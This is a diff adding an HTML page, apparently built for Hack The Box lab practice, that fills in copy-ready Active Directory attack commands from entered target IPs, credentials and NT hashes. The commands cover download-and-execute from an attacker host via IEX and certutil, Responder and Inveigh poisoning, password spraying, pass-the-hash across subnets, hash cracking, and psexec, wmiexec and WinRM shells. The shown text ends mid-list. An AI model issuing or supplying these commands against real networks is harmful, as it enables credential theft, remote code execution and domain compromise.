@@ -1,0 +1,289 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AD PenTest Arsenal v3.0 | Complete HTB Edition</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Orbitron:wght@700;800&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}:root{--bg:#050508;--bg2:#0a0a0f;--bg3:#12121a;--red:#ff2d55;--green:#00ff9d;--blue:#00d4ff;--orange:#ff9500;--purple:#bf5af2;--text:#f0f0f5;--text2:#8888a0;--border:#2a2a3a}body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;line-height:1.6}.header{background:linear-gradient(180deg,var(--bg3),var(--bg));border-bottom:1px solid var(--red);padding:15px 25px;position:sticky;top:0;z-index:1000}.header-content{max-width:1900px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:15px}.logo h1{font-family:'Orbitron',sans-serif;font-size:1.3em;background:linear-gradient(90deg,var(--red),#ff6b8a);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.logo .sub{font-size:.65em;color:var(--text2)}.stats{display:flex;gap:15px}.stat{background:var(--bg3);border:1px solid var(--border);border-radius:20px;padding:6px 14px;font-size:.8em}.stat b{color:var(--green)}.main{display:grid;grid-template-columns:360px 1fr;min-height:calc(100vh - 70px)}.sidebar{background:var(--bg2);border-right:1px solid var(--border);padding:20px;overflow-y:auto;max-height:calc(100vh - 70px);position:sticky;top:70px}.sidebar::-webkit-scrollbar{width:5px}.sidebar::-webkit-scrollbar-thumb{background:var(--red);border-radius:3px}.section{margin-bottom:20px}.section h2{font-size:.75em;color:var(--text2);border-bottom:1px solid var(--border);padding-bottom:8px;margin-bottom:12px;text-transform:uppercase;letter-spacing:1px}.form-grid{display:grid;gap:10px}.form-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}label{font-size:.65em;color:var(--text2);text-transform:uppercase;margin-bottom:4px;display:block}input{width:100%;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--green);font-family:inherit;font-size:.85em}input:focus{outline:none;border-color:var(--red)}.btns{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:15px}.btn{padding:10px;border:none;border-radius:6px;font-family:inherit;font-size:.75em;font-weight:600;cursor:pointer;text-transform:uppercase}.btn-primary{background:linear-gradient(135deg,var(--red),var(--purple));color:#fff;grid-column:span 2}.btn-secondary{background:var(--bg3);color:var(--text);border:1px solid var(--border)}.target{background:var(--bg);border:1px solid var(--green);border-radius:8px;padding:12px;margin-top:15px;display:none}.target.active{display:block}.target h3{color:var(--green);font-size:.7em;margin-bottom:10px}.target-row{display:flex;justify-content:space-between;font-size:.7em;padding:3px 0;border-bottom:1px solid var(--border)}.target-row:last-child{border:none}.target-row .k{color:var(--text2)}.target-row .v{color:var(--green)}.quick{margin-top:20px;padding-top:15px;border-top:1px solid var(--border)}.quick h3{font-size:.7em;color:var(--text2);margin-bottom:10px}.quick-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}.qbtn{padding:6px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:.6em;cursor:pointer;font-family:inherit}.qbtn:hover{border-color:var(--blue);color:var(--blue)}.content{padding:20px;overflow-y:auto}.filters{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:12px;margin-bottom:20px;display:flex;gap:12px;flex-wrap:wrap;align-items:center;position:sticky;top:0;z-index:100}.search{flex:1;min-width:200px;position:relative}.search input{padding-left:35px}.search::before{content:'🔍';position:absolute;left:10px;top:50%;transform:translateY(-50%);font-size:12px;opacity:.5}select{padding:8px 12px;background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:inherit;font-size:.8em;min-width:130px}.phase{margin-bottom:25px}.phase-head{background:linear-gradient(90deg,var(--red),transparent);padding:12px 20px;border-radius:8px 8px 0 0;display:flex;justify-content:space-between;cursor:pointer}.phase-head h3{font-family:'Orbitron',sans-serif;font-size:.85em;color:#fff;text-transform:uppercase}.phase-head span{background:rgba(255,255,255,.2);padding:2px 10px;border-radius:10px;font-size:.7em}.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(460px,1fr));gap:12px;padding:12px;background:var(--bg3);border:1px solid var(--border);border-top:none;border-radius:0 0 8px 8px}.cards.collapsed{display:none}.card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:15px;transition:all .3s}.card:hover{border-color:var(--red);transform:translateY(-2px)}.card.copied{border-color:var(--green);box-shadow:0 0 20px rgba(0,255,157,.3)}.card-head{display:flex;justify-content:space-between;gap:8px;margin-bottom:8px}.card-title{font-size:.85em;font-weight:600;color:#ff6b8a}.badges{display:flex;gap:4px}.badge{font-size:.55em;padding:2px 6px;border-radius:3px;text-transform:uppercase;font-weight:600}.b-none{background:rgba(0,255,157,.15);color:var(--green);border:1px solid var(--green)}.b-req{background:rgba(255,149,0,.15);color:var(--orange);border:1px solid var(--orange)}.b-linux{background:rgba(0,212,255,.15);color:var(--blue);border:1px solid var(--blue)}.b-win{background:rgba(255,45,85,.15);color:#ff6b8a;border:1px solid var(--red)}.b-both{background:rgba(191,90,242,.15);color:var(--purple);border:1px solid var(--purple)}.card-desc{font-size:.7em;color:var(--text2);margin-bottom:8px}.card-meta{display:flex;gap:6px;margin-bottom:10px}.meta{font-size:.6em;padding:3px 8px;background:var(--bg);border-radius:3px;color:var(--text2)}.cmd-box{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:10px;margin-bottom:10px}.cmd-text{color:var(--green);font-size:.7em;line-height:1.6;white-space:pre-wrap;word-break:break-word;max-height:120px;overflow-y:auto}.cmd-text::-webkit-scrollbar{width:4px}.cmd-text::-webkit-scrollbar-thumb{background:var(--green);border-radius:2px}.copy-btn{width:100%;padding:8px;background:linear-gradient(135deg,var(--red),var(--purple));border:none;border-radius:5px;color:#fff;font-family:inherit;font-size:.65em;font-weight:600;cursor:pointer;text-transform:uppercase}.toast{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(.8);background:var(--green);color:var(--bg);padding:15px 30px;border-radius:8px;font-weight:700;opacity:0;pointer-events:none;z-index:10000;transition:all .3s}.toast.show{opacity:1;transform:translate(-50%,-50%) scale(1)}.empty{text-align:center;padding:60px;color:var(--text2)}.empty .icon{font-size:3em;opacity:.3;margin-bottom:15px}@media(max-width:1200px){.main{grid-template-columns:1fr}.sidebar{max-height:none;position:relative;top:0}.cards{grid-template-columns:1fr}}@media(max-width:768px){.header-content{flex-direction:column}.filters{flex-direction:column}.search{width:100%}select{width:100%}.quick-grid{grid-template-columns:1fr 1fr}}
+    </style>
+</head>
+<body>
+<header class="header"><div class="header-content"><div class="logo"><h1>⚔ AD PenTest Arsenal</h1><div class="sub">By @mahdiesta</div></div><div class="stats"><div class="stat"><b id="total">0</b> Total</div><div class="stat"><b id="visible">0</b> Visible</div><div class="stat"><b id="ready">0</b> Ready</div></div></div></header>
+<div class="main">
+<aside class="sidebar">
+<div class="section"><h2>🎯 Target</h2><div class="form-grid">
+<div><label>DC Name (FQDN)</label><input id="dcName" placeholder="DC01.INLANEFREIGHT.LOCAL"></div>
+<div><label>DC IP</label><input id="dcIP" placeholder="172.16.5.5"></div>
+<div class="form-row"><div><label>Domain</label><input id="domain" placeholder="INLANEFREIGHT.LOCAL"></div><div><label>NetBIOS</label><input id="domainShort" placeholder="INLANEFREIGHT"></div></div>
+<div><label>Target Host</label><input id="targetHost" placeholder="172.16.5.25"></div>
+</div></div>
+<div class="section"><h2>🔑 Credentials</h2><div class="form-grid">
+<div><label>Attacker IP</label><input id="attackerIP" placeholder="10.10.14.5"></div>
+<div class="form-row"><div><label>Username</label><input id="username" placeholder="forend"></div><div><label>Password</label><input id="password" placeholder="Klmcargo2"></div></div>
+<div><label>NT Hash</label><input id="ntHash" placeholder="88ad09182de639ccc6579eb0849751cf"></div>
+<div class="form-row"><div><label>Target User</label><input id="targetUser" placeholder="sqldev"></div><div><label>Interface</label><input id="iface" placeholder="eth0"></div></div>
+</div></div>
+<div class="btns"><button class="btn btn-primary" onclick="load()">⚡ Generate</button><button class="btn btn-secondary" onclick="reset()">🔄 Reset</button><button class="btn btn-secondary" onclick="exp()">💾 Export</button></div>
+<div class="target" id="tgt"><h3>📡 Active Target</h3><div id="tgtInfo"></div></div>
+<div class="quick"><h3>⚡ Quick Filters</h3><div class="quick-grid">
+<button class="qbtn" onclick="qf('none')">No Creds</button><button class="qbtn" onclick="qf('kerbrute')">Kerbrute</button><button class="qbtn" onclick="qf('responder')">Responder</button>
+<button class="qbtn" onclick="qf('hashcat')">Hashcat</button><button class="qbtn" onclick="qf('bloodhound')">BloodHound</button><button class="qbtn" onclick="qf('mimikatz')">Mimikatz</button>
+<button class="qbtn" onclick="qf('rubeus')">Rubeus</button><button class="qbtn" onclick="qf('impacket')">Impacket</button><button class="qbtn" onclick="qf('powerview')">PowerView</button>
+<button class="qbtn" onclick="qf('netexec')">NetExec</button><button class="qbtn" onclick="qf('ldap')">LDAP</button><button class="qbtn" onclick="qf('dcsync')">DCSync</button>
+</div></div>
+</aside>
+<main class="content">
+<div class="filters">
+<div class="search"><input id="search" placeholder="Search commands..." oninput="filter()"></div>
+<select id="phaseF" onchange="filter()"><option value="">All Phases</option></select>
+<select id="credF" onchange="filter()"><option value="">All Auth</option><option value="none">No Creds</option><option value="required">Creds Required</option></select>
+<select id="osF" onchange="filter()"><option value="">All OS</option><option value="linux">Linux</option><option value="windows">Windows</option><option value="both">Both</option></select>
+<button class="btn btn-secondary" onclick="clearF()">Clear</button>
+</div>
+<div id="container"></div>
+</main>
+</div>
+<div class="toast" id="toast">✓ Copied!</div>
+<script>
+const cmds=[
+// PHASE 0: SETUP
+{p:"Phase 0: Setup",t:"Python HTTP Server",d:"Host files for download",c:"File Transfer",tool:"Python",os:"linux",auth:"none",cmd:"sudo python3 -m http.server 8001"},
+{p:"Phase 0: Setup",t:"Impacket SMB Server",d:"SMB share with authentication",c:"File Transfer",tool:"Impacket",os:"linux",auth:"none",cmd:"impacket-smbserver -ip {ATTACKER_IP} -smb2support -username user -password password shared /home/user/"},
+{p:"Phase 0: Setup",t:"PowerShell IEX Download",d:"Download and execute in memory",c:"File Transfer",tool:"PowerShell",os:"windows",auth:"none",cmd:"IEX(New-Object Net.WebClient).downloadString('http://{ATTACKER_IP}:8001/script.ps1')"},
+{p:"Phase 0: Setup",t:"Certutil Download",d:"Download file via certutil LOLBin",c:"File Transfer",tool:"certutil",os:"windows",auth:"none",cmd:"certutil -urlcache -split -f http://{ATTACKER_IP}:8001/tool.exe C:\\Windows\\Temp\\tool.exe"},
+
+// PHASE 1: INITIAL ENUMERATION
+{p:"Phase 1: Initial Enum",t:"tcpdump - Capture",d:"Capture network packets on interface",c:"Network",tool:"tcpdump",os:"linux",auth:"none",cmd:"sudo tcpdump -i {INTERFACE} -w capture.pcap"},
+{p:"Phase 1: Initial Enum",t:"Responder - Analyze",d:"Passive LLMNR/NBT-NS analysis",c:"LLMNR/NBT-NS",tool:"Responder",os:"linux",auth:"none",cmd:"sudo responder -I {INTERFACE} -A"},
+{p:"Phase 1: Initial Enum",t:"Responder - Poison",d:"Active poisoning to capture hashes",c:"LLMNR/NBT-NS",tool:"Responder",os:"linux",auth:"none",cmd:"sudo responder -I {INTERFACE} -wPv"},
+{p:"Phase 1: Initial Enum",t:"fping - Ping Sweep",d:"Fast host discovery on subnet",c:"Network",tool:"fping",os:"linux",auth:"none",cmd:"fping -asgq {NETWORK}.0/23"},
+{p:"Phase 1: Initial Enum",t:"Nmap - Full Scan",d:"Comprehensive scan with scripts",c:"Network",tool:"Nmap",os:"linux",auth:"none",cmd:"sudo nmap -v -A -iL hosts.txt -oN host-enum.txt"},
+{p:"Phase 1: Initial Enum",t:"Nmap - AD Ports",d:"Quick scan of AD-specific ports",c:"Network",tool:"Nmap",os:"linux",auth:"none",cmd:"nmap -Pn -sV -p 53,88,135,139,389,445,636,3268,5985 {DC_IP} -oN nmap-ad.txt"},
+
+// PHASE 2: KERBRUTE & USER ENUM
+{p:"Phase 2: User Enum",t:"Kerbrute - User Enum",d:"Enumerate valid users via Kerberos",c:"User Enum",tool:"Kerbrute",os:"linux",auth:"none",cmd:"kerbrute userenum -d {DOMAIN} --dc {DC_IP} users.txt -o kerb-results.txt"},
+{p:"Phase 2: User Enum",t:"Kerbrute - Password Spray",d:"Spray password against user list",c:"Password Spray",tool:"Kerbrute",os:"linux",auth:"none",cmd:"kerbrute passwordspray -d {DOMAIN} --dc {DC_IP} valid_users.txt '{PASSWORD}'"},
+{p:"Phase 2: User Enum",t:"enum4linux - Full",d:"Comprehensive SMB/RPC enumeration",c:"SMB",tool:"enum4linux",os:"linux",auth:"none",cmd:"enum4linux -a {DC_IP}"},
+{p:"Phase 2: User Enum",t:"enum4linux - Password Policy",d:"Enumerate password policy",c:"SMB",tool:"enum4linux",os:"linux",auth:"none",cmd:"enum4linux -P {DC_IP}"},
+{p:"Phase 2: User Enum",t:"enum4linux - Users",d:"Enumerate domain users",c:"SMB",tool:"enum4linux",os:"linux",auth:"none",cmd:"enum4linux -U {DC_IP} | grep 'user:' | cut -f2 -d'[' | cut -f1 -d']'"},
+{p:"Phase 2: User Enum",t:"enum4linux-ng",d:"Modern enum4linux with JSON output",c:"SMB",tool:"enum4linux-ng",os:"linux",auth:"none",cmd:"enum4linux-ng -P {DC_IP} -oA ilfreight"},
+{p:"Phase 2: User Enum",t:"rpcclient - NULL Session",d:"Connect with NULL session",c:"RPC",tool:"rpcclient",os:"linux",auth:"none",cmd:"rpcclient -U '' -N {DC_IP}"},
+{p:"Phase 2: User Enum",t:"rpcclient - Enum Users",d:"Enumerate domain users via RPC",c:"RPC",tool:"rpcclient",os:"linux",auth:"none",cmd:"rpcclient -U '' -N {DC_IP} -c 'enumdomusers'"},
+{p:"Phase 2: User Enum",t:"rpcclient - Query Domain",d:"Get domain info and password policy",c:"RPC",tool:"rpcclient",os:"linux",auth:"none",cmd:"rpcclient -U '' -N {DC_IP} -c 'querydominfo'"},
+{p:"Phase 2: User Enum",t:"rpcclient - Query User",d:"Query specific user by RID",c:"RPC",tool:"rpcclient",os:"linux",auth:"none",cmd:"rpcclient -U '' -N {DC_IP} -c 'queryuser 0x457'"},
+
+// PHASE 3: PASSWORD ATTACKS
+{p:"Phase 3: Password Attacks",t:"CrackMapExec - Pass Policy",d:"Get password policy (check before spraying!)",c:"Pre-Attack",tool:"CrackMapExec",os:"linux",auth:"required",cmd:"crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --pass-pol"},
+{p:"Phase 3: Password Attacks",t:"ldapsearch - Pass Policy",d:"Get password policy via LDAP",c:"Pre-Attack",tool:"ldapsearch",os:"linux",auth:"none",cmd:"ldapsearch -h {DC_IP} -x -b 'DC={DOMAIN_SHORT},DC=LOCAL' -s sub '*' | grep -m 1 -B 10 pwdHistoryLength"},
+{p:"Phase 3: Password Attacks",t:"NetExec - Spray",d:"Password spray with NetExec",c:"Password Spray",tool:"NetExec",os:"linux",auth:"none",cmd:"netexec smb {DC_IP} -u users.txt -p '{PASSWORD}' --continue-on-success | tee spray.txt"},
+{p:"Phase 3: Password Attacks",t:"CrackMapExec - Spray",d:"Password spray with CrackMapExec",c:"Password Spray",tool:"CrackMapExec",os:"linux",auth:"none",cmd:"sudo crackmapexec smb {DC_IP} -u valid_users.txt -p '{PASSWORD}' | grep +"},
+{p:"Phase 3: Password Attacks",t:"CrackMapExec - Validate",d:"Validate discovered credentials",c:"Validation",tool:"CrackMapExec",os:"linux",auth:"none",cmd:"sudo crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}'"},
+{p:"Phase 3: Password Attacks",t:"CrackMapExec - Local PTH",d:"Pass-the-Hash with local admin",c:"PTH",tool:"CrackMapExec",os:"linux",auth:"none",cmd:"sudo crackmapexec smb --local-auth {NETWORK}.0/24 -u administrator -H {NTHASH} | grep +"},
+{p:"Phase 3: Password Attacks",t:"Hashcat - NTLMv2",d:"Crack NTLMv2 hashes from Responder",c:"Cracking",tool:"Hashcat",os:"linux",auth:"none",cmd:"hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force"},
+{p:"Phase 3: Password Attacks",t:"Hashcat - With Rules",d:"Crack with rules for better coverage",c:"Cracking",tool:"Hashcat",os:"linux",auth:"none",cmd:"hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"},
+{p:"Phase 3: Password Attacks",t:"rpcclient - Spray",d:"Password spray via RPC",c:"Password Spray",tool:"rpcclient",os:"linux",auth:"none",cmd:"for u in $(cat valid_users.txt);do rpcclient -U \"$u%{PASSWORD}\" -c 'getusername;quit' {DC_IP} | grep Authority; done"},
+{p:"Phase 3: Password Attacks",t:"Inveigh - Windows",d:"Windows LLMNR/NBNS poisoning",c:"LLMNR/NBT-NS",tool:"Inveigh",os:"windows",auth:"none",cmd:"Import-Module .\\Inveigh.ps1\nInvoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y"},
+{p:"Phase 3: Password Attacks",t:"Inveigh.exe",d:"C# implementation of Inveigh",c:"LLMNR/NBT-NS",tool:"Inveigh",os:"windows",auth:"none",cmd:".\\Inveigh.exe"},
+{p:"Phase 3: Password Attacks",t:"DomainPasswordSpray",d:"PowerShell domain password spray",c:"Password Spray",tool:"DomainPasswordSpray",os:"windows",auth:"none",cmd:"Import-Module .\\DomainPasswordSpray.ps1\nInvoke-DomainPasswordSpray -Password '{PASSWORD}' -OutFile spray_success -ErrorAction SilentlyContinue"},
+{p:"Phase 3: Password Attacks",t:"net accounts",d:"Windows native password policy",c:"Pre-Attack",tool:"Native",os:"windows",auth:"required",cmd:"net accounts"},
+
+// PHASE 4: WINDAPSEARCH & LDAP
+{p:"Phase 4: LDAP Enum",t:"windapsearch - Help",d:"Display windapsearch options",c:"LDAP",tool:"windapsearch",os:"linux",auth:"none",cmd:"python3 windapsearch.py -h"},
+{p:"Phase 4: LDAP Enum",t:"windapsearch - Anonymous",d:"Enumerate users anonymously",c:"LDAP",tool:"windapsearch",os:"linux",auth:"none",cmd:"python3 windapsearch.py --dc-ip {DC_IP} -u '' -U"},
+{p:"Phase 4: LDAP Enum",t:"windapsearch - Domain Admins",d:"Enumerate Domain Admins",c:"LDAP",tool:"windapsearch",os:"linux",auth:"required",cmd:"python3 windapsearch.py --dc-ip {DC_IP} -u '{DOMAIN_SHORT}\\{USERNAME}' -p '{PASSWORD}' --da"},
+{p:"Phase 4: LDAP Enum",t:"windapsearch - Priv Users",d:"Recursive privileged user search",c:"LDAP",tool:"windapsearch",os:"linux",auth:"required",cmd:"python3 windapsearch.py --dc-ip {DC_IP} -u '{DOMAIN_SHORT}\\{USERNAME}' -p '{PASSWORD}' -PU"},
+{p:"Phase 4: LDAP Enum",t:"ldapsearch - All Users",d:"Dump users via LDAP",c:"LDAP",tool:"ldapsearch",os:"linux",auth:"required",cmd:"ldapsearch -H ldap://{DC_IP} -x -D '{USERNAME}@{DOMAIN}' -w '{PASSWORD}' -b '{BASE_DN}' '(objectClass=user)' sAMAccountName"},
+{p:"Phase 4: LDAP Enum",t:"ldapsearch - Anonymous",d:"Test anonymous LDAP bind",c:"LDAP",tool:"ldapsearch",os:"linux",auth:"none",cmd:"ldapsearch -H ldap://{DC_IP} -x -s base namingcontexts"},
+{p:"Phase 4: LDAP Enum",t:"ldapdomaindump",d:"Full LDAP dump with HTML reports",c:"LDAP",tool:"ldapdomaindump",os:"linux",auth:"required",cmd:"ldapdomaindump -u '{DOMAIN}\\{USERNAME}' -p '{PASSWORD}' ldap://{DC_IP} -o ldap-dump/"},
+
+// PHASE 5: CREDENTIALED ENUMERATION
+{p:"Phase 5: Cred Enum",t:"xfreerdp - RDP",d:"Remote Desktop connection",c:"Access",tool:"xfreerdp",os:"linux",auth:"required",cmd:"xfreerdp /u:{USERNAME}@{DOMAIN} /p:'{PASSWORD}' /v:{TARGET_HOST}"},
+{p:"Phase 5: Cred Enum",t:"CrackMapExec - Users",d:"Enumerate domain users",c:"AD Enum",tool:"CrackMapExec",os:"linux",auth:"required",cmd:"sudo crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --users"},
+{p:"Phase 5: Cred Enum",t:"CrackMapExec - Groups",d:"Enumerate domain groups",c:"AD Enum",tool:"CrackMapExec",os:"linux",auth:"required",cmd:"sudo crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --groups"},
+{p:"Phase 5: Cred Enum",t:"CrackMapExec - Logged On",d:"Find logged on users",c:"AD Enum",tool:"CrackMapExec",os:"linux",auth:"required",cmd:"sudo crackmapexec smb {TARGET_HOST} -u {USERNAME} -p '{PASSWORD}' --loggedon-users"},
+{p:"Phase 5: Cred Enum",t:"CrackMapExec - Shares",d:"Enumerate SMB shares",c:"Shares",tool:"CrackMapExec",os:"linux",auth:"required",cmd:"sudo crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --shares"},
+{p:"Phase 5: Cred Enum",t:"CrackMapExec - Spider",d:"Spider shares for files",c:"Shares",tool:"CrackMapExec",os:"linux",auth:"required",cmd:"sudo crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M spider_plus --share 'Dev-share'"},
+{p:"Phase 5: Cred Enum",t:"smbmap - Shares",d:"Map shares with permissions",c:"Shares",tool:"smbmap",os:"linux",auth:"required",cmd:"smbmap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -H {DC_IP}"},
+{p:"Phase 5: Cred Enum",t:"smbmap - Recursive",d:"Recursive share listing",c:"Shares",tool:"smbmap",os:"linux",auth:"required",cmd:"smbmap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -H {DC_IP} -R SYSVOL --dir-only"},
+{p:"Phase 5: Cred Enum",t:"psexec.py - Shell",d:"SYSTEM shell via SMB",c:"Access",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-psexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_HOST}"},
+{p:"Phase 5: Cred Enum",t:"wmiexec.py - Shell",d:"Shell via WMI (stealthier)",c:"Access",tool:"Impacket",os:"linux",auth:"required",cmd:"impacket-wmiexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP}"},
+{p:"Phase 5: Cred Enum",t:"Evil-WinRM",d:"WinRM shell access",c:"Access",tool:"Evil-WinRM",os:"linux",auth:"required",cmd:"evil-winrm -i {TARGET_HOST} -u {USERNAME} -p '{PASSWORD}'"},
+{p:"Phase 5: Cred Enum",t:"BloodHound Python",d:"Collect AD data for BloodHound",c:"BloodHound",tool:"BloodHound",os:"linux",auth:"required",cmd:"sudo bloodhound-python -u '{USERNAME}' -p '{PASSWORD}' -ns {DC_IP} -d {DOMAIN} -c all"},
+{p:"Phase 5: Cred Enum",t:"SharpHound",d:"Windows BloodHound collector",c:"BloodHound",tool:"BloodHound",os:"windows",auth:"required",cmd:".\\SharpHound.exe -c All --zipfilename bloodhound.zip"},
+
+// PHASE 6: POWERVIEW
+{p:"Phase 6: PowerView",t:"Import PowerView",d:"Load PowerView module",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Import-Module .\\PowerView.ps1"},
+{p:"Phase 6: PowerView",t:"Get-Domain",d:"Get domain information",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-Domain"},
+{p:"Phase 6: PowerView",t:"Get-DomainController",d:"List domain controllers",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainController"},
+{p:"Phase 6: PowerView",t:"Get-DomainUser",d:"List all domain users",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainUser"},
+{p:"Phase 6: PowerView",t:"Get-DomainUser - SPN",d:"Find Kerberoastable users",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName"},
+{p:"Phase 6: PowerView",t:"Get-DomainUser - NoPreauth",d:"Find AS-REP roastable users",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,userprincipalname,useraccountcontrol"},
+{p:"Phase 6: PowerView",t:"Get-DomainComputer",d:"List domain computers",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainComputer"},
+{p:"Phase 6: PowerView",t:"Get-DomainGroup",d:"List domain groups",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainGroup | Select-Object name"},
+{p:"Phase 6: PowerView",t:"Get-DomainGroupMember",d:"Domain Admins members (recursive)",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainGroupMember -Identity 'Domain Admins' -Recurse"},
+{p:"Phase 6: PowerView",t:"Get-DomainOU",d:"List Organizational Units",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainOU"},
+{p:"Phase 6: PowerView",t:"Get-DomainGPO",d:"List GPOs",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainGPO | Select-Object displayname,gpcfilesyspath"},
+{p:"Phase 6: PowerView",t:"Get-DomainPolicy",d:"Get domain password policy",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainPolicy"},
+{p:"Phase 6: PowerView",t:"Get-DomainTrust",d:"Enumerate domain trusts",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainTrust"},
+{p:"Phase 6: PowerView",t:"Get-ForestTrust",d:"Enumerate forest trusts",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-ForestTrust"},
+{p:"Phase 6: PowerView",t:"Get-DomainTrustMapping",d:"Map all trust relationships",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainTrustMapping"},
+{p:"Phase 6: PowerView",t:"Find-LocalAdminAccess",d:"Find where you're local admin",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Find-LocalAdminAccess -Verbose"},
+{p:"Phase 6: PowerView",t:"Find-DomainUserLocation",d:"Find where users are logged in",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Find-DomainUserLocation"},
+{p:"Phase 6: PowerView",t:"Find-DomainShare",d:"Find accessible shares",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Find-DomainShare"},
+{p:"Phase 6: PowerView",t:"Find-InterestingDomainShareFile",d:"Find sensitive files",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Find-InterestingDomainShareFile"},
+{p:"Phase 6: PowerView",t:"Get-NetLocalGroup",d:"Enumerate local groups",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-NetLocalGroup"},
+{p:"Phase 6: PowerView",t:"Get-NetLocalGroupMember",d:"Get local admin members",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-NetLocalGroupMember -GroupName Administrators"},
+{p:"Phase 6: PowerView",t:"Get-NetSession",d:"Get active sessions",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-NetSession"},
+{p:"Phase 6: PowerView",t:"Test-AdminAccess",d:"Test local admin access",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Test-AdminAccess -ComputerName {DC_NAME}"},
+{p:"Phase 6: PowerView",t:"Get-DomainForeignUser",d:"Find foreign domain users",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainForeignUser"},
+{p:"Phase 6: PowerView",t:"Get-DomainForeignGroupMember",d:"Find foreign group members",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainForeignGroupMember"},
+{p:"Phase 6: PowerView",t:"Convert-NameToSid",d:"Convert name to SID",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Convert-NameToSid {USERNAME}"},
+{p:"Phase 6: PowerView",t:"Get-DomainSPNTicket",d:"Request TGS ticket for SPN",c:"PowerView",tool:"PowerView",os:"windows",auth:"required",cmd:"Get-DomainSPNTicket -SPN 'MSSQLSvc/{DC_NAME}:1433'"},
+{p:"Phase 6: PowerView",t:"Snaffler",d:"Find sensitive data in shares",c:"File Search",tool:"Snaffler",os:"windows",auth:"required",cmd:".\\Snaffler.exe -d {DOMAIN} -s -v data"},
+
+// PHASE 7: SECURITY CONTROLS
+{p:"Phase 7: Security",t:"Get-MpComputerStatus",d:"Check Windows Defender status",c:"Defenses",tool:"PowerShell",os:"windows",auth:"required",cmd:"Get-MpComputerStatus"},
+{p:"Phase 7: Security",t:"Get-AppLockerPolicy",d:"View AppLocker rules",c:"Defenses",tool:"PowerShell",os:"windows",auth:"required",cmd:"Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections"},
+{p:"Phase 7: Security",t:"PS Language Mode",d:"Check PowerShell language mode",c:"Defenses",tool:"PowerShell",os:"windows",auth:"required",cmd:"$ExecutionContext.SessionState.LanguageMode"},
+{p:"Phase 7: Security",t:"Find-LAPSDelegatedGroups",d:"Find LAPS delegated groups",c:"LAPS",tool:"LAPSToolkit",os:"windows",auth:"required",cmd:"Find-LAPSDelegatedGroups"},
+{p:"Phase 7: Security",t:"Find-AdmPwdExtendedRights",d:"Find LAPS read access",c:"LAPS",tool:"LAPSToolkit",os:"windows",auth:"required",cmd:"Find-AdmPwdExtendedRights"},
